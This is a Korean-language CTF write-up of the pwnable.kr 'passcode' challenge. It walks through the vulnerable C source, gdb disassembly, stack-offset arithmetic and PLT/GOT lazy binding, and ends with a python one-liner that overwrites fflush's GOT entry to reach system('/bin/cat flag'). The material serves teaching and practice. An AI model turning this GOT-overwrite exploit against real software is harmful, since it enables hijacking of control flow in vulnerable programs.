---
sort: 5
---

# passcode

home 디렉토리에 passcode.c 파일을 통해 소스코드를 볼 수 있다.

```c
#include <stdio.h>
#include <stdlib.h>

void login(){
        int passcode1;
        int passcode2;

        printf("enter passcode1 : ");
        scanf("%d", passcode1);
        fflush(stdin);

        // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
        printf("enter passcode2 : ");
        scanf("%d", passcode2);

        printf("checking...\n");
        if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
                exit(0);
        }
}

void welcome(){
        char name[100];
        printf("enter you name : ");
        scanf("%100s", name);
        printf("Welcome %s!\n", name);
}

int main(){
        printf("Toddler's Secure Login System 1.0 beta.\n");

        welcome();
        login();

        // something after login...
        printf("Now I can safely trust you that you have credential :)\n");
        return 0;
}
```

login함수에 scanf사용되는 곳 보면 passcode1과 passcode2앞에 &가 붙어있지 않은 것을 볼 수 있다. 따라서 passcode1과 passcode2의 주소값이 아닌 passcode1과 passcode2에 담겨있는 값 자체를 주소값으로써 사용하게 된다. passcode1, 2는 초기화가 되지 않으므로 메모리 상에 존재하는 쓰레기 값이 사용될 수 있다. 이 쓰레기 값을 우리가 조작할 수 있다면 충분히 exploit할 수 있을 것이다.<br><br>
사용자가 넣을 수 있는 input값으로 welcome의 name이 있으니 해당 부분과 passcode1, 2의 주소값을 살펴보았다.

```gdb
(gdb) disas welcome
Dump of assembler code for function welcome:
   0x08048609 <+0>:     push   %ebp
   0x0804860a <+1>:     mov    %esp,%ebp

   ... (중략) ...

   0x0804862f <+38>:    lea    -0x70(%ebp),%edx    <-- name
   0x08048632 <+41>:    mov    %edx,0x4(%esp)
   0x08048636 <+45>:    mov    %eax,(%esp)
   0x08048639 <+48>:    call   0x80484a0 <__isoc99_scanf@plt>

   ... (후략) ...

(gdb) b* 0x08048632        <-- name의 주소가 edx안에 있음
Breakpoint 1 at 0x8048632

(gdb) disas login
Dump of assembler code for function login:
   0x08048564 <+0>:     push   %ebp
   0x08048565 <+1>:     mov    %esp,%ebp

   ... (중략) ...

   0x0804857c <+24>:    mov    -0x10(%ebp),%edx     <-- passcode1
   0x0804857f <+27>:    mov    %edx,0x4(%esp)
   0x08048583 <+31>:    mov    %eax,(%esp)
   0x08048586 <+34>:    call   0x80484a0 <__isoc99_scanf@plt>

   0x0804858b <+39>:    mov    0x804a02c,%eax
   0x08048590 <+44>:    mov    %eax,(%esp)
   0x08048593 <+47>:    call   0x8048430 <fflush@plt>
   0x08048598 <+52>:    mov    $0x8048786,%eax
   0x0804859d <+57>:    mov    %eax,(%esp)
   0x080485a0 <+60>:    call   0x8048420 <printf@plt>
   0x080485a5 <+65>:    mov    $0x8048783,%eax

   0x080485aa <+70>:    mov    -0xc(%ebp),%edx      <-- passcode2
   0x080485ad <+73>:    mov    %edx,0x4(%esp)
   0x080485b1 <+77>:    mov    %eax,(%esp)
   0x080485b4 <+80>:    call   0x80484a0 <__isoc99_scanf@plt>

   ... (중략) ...

   0x080485e3 <+127>:   movl   $0x80487af,(%esp)
   0x080485ea <+134>:   call   0x8048460 <system@plt>

   ... (후략) ...

(gdb) b* 0x0804857f        <-- passcode1의 주소가 ebp - 0x10임
Breakpoint 2 at 0x804857f

Breakpoint 1, 0x08048632 in welcome ()
(gdb) i r edx
edx            0xffb89088       -4681592  <-- name의 주소

Breakpoint 2, 0x0804857f in login ()
(gdb) i r ebp
ebp            0xffb890f8       0xffb890f8   <-- login함수의 ebp값. passcode1과 passcode2는 같은 함수 내에 있으므로 ebp 값이 같음.
```

정리를 하자면, gdb로 살펴보았을 때 name의 주소는 0xffb89088, passcode1의 주소는 0xffb890e8, passcode2의 주소는 0xffb890ec이다. <br>
어차피 stack에는 ASLR이 걸려있기 때문에 각각의 주소값 자체는 변하겠지만 주소 사이의 간격은 변하지 않기 때문에 간격을 계산해야한다. <br><br>
name과 passcode1과의 간격 : 0xffb890e8 - 0xffb89088 = 96byte <br>
name과 passcode2와의 관격 : 0xffb890ec - 0xffb89088 = 100byte <br><br>
name에 입력할 수 있는 최대길이가 100byte이기 때문에 passcode1값만 임의로 조작할 수 있다.<br>
그리고 또 하나 중요한 사실은, passcode2값은 조종할 수 없기 때문에 passcode2에는 쓰레기값이 들어가있다. 따라서 passcode2를 사용하는 login의 두번째 scanf를 처리하는 도중 segmentation fault가 발생하게 된다. 결국 두번째 scanf에 다다르기 전에 passcode1의 조작을 통해 프로그램의 흐름을 변경해야 segmentation fault가 발생하지 않고 공격에 성공할 수 있게 된다. **함수들이 plt, got를 이용한다는 점을 이용하여 두번째 scanf에 도달하기 전에 존재하는 함수의 got값을 조작하여 프로그램의 흐름을 변경하려고 한다.**

## plt, got

shared library에 존재하는 함수들의 동적 load를 위해서 plt, got가 사용된다.<br>
plt는 함수를 동적으로 로드하는 루틴 및 실제 함수 루틴으로 연결해주는 연결고리 역할을 하는 코드이고, got는 plt루틴이 점프할 위치(주소값)를 저장해놓는 영역이다.<br>

```gdb
(gdb) x/3i 0x8048430
   0x8048430 <fflush@plt>:      jmp    *0x804a004 <-- fflush함수의 got영역
   0x8048436 <fflush@plt+6>:    push   $0x8       <-- fflush함수 동적 load루틴
   0x804843b <fflush@plt+11>:   jmp    0x8048410

(gdb) x/wx 0x804a004
0x804a004 <fflush@got.plt>:     0x08048436
```

프로그램이 실행되자마자 사용되는 함수들을 모두 load해놓고 프로그램을 돌리지 않는다. **프로그램에서 해당 함수를 처음 호출할 때가 되어서야 해당 함수를 load하는데, 이를 lazy binding이라고 한다.** <br>
got영역에는 plt에서 jump할 주소가 들어있는데, 함수가 처음으로 호출될때에는 해당 함수를 동적으로 load하는 루틴으로 jump하도록 하는 루틴의 주소로 설정되어있다. 해당 주소는 plt영역내에 있다.<br>
함수를 load하는 루틴에서 함수를 load한 후 함수의 주소를 got영역에 쓴다. 따라서 해당 함수를 다시 부르게 될 경우, got값이 해당 함수 값으로 변경이 되어있기 때문에 다시 load 루틴으로 가지 않고 바로 함수로 jump하게 된다.<br><br>
**따라서 함수의 got값을 조진다면, 프로그램의 흐름을 원하는대로 바꿀 수 있게 된다.** <br><br>
login함수를 살펴보니, 첫번째 scanf와 두번째 scanf사이에 fflush함수가 존재하길래 fflush함수의 got값을 login함수 내에 존재하는 system("/bin/cat flag") 루틴의 주소로 변경했다.<br>
name을 통해서 passcode1부분에 fflush의 got영역 주소를 쓰고, login함수의 첫번째 scanf에서 system("/bin/cat flag")루틴의 주소를 입력하게 되면 fflush함수가 호출되는 순간 flag를 얻을 수 있다.

```bash
#                        fflush got의 주소 = 0x804a004        0x080485e3 = 134514135
passcode@pwnable:~$ (python -c "print('\x04\xa0\x04\x08'*25+'\n134514135\n')";cat) | ./passcode
```

```tip
## 알게 된 점

scanf쓸 때 & 잘 붙이자.

plt, got, lazy binding
```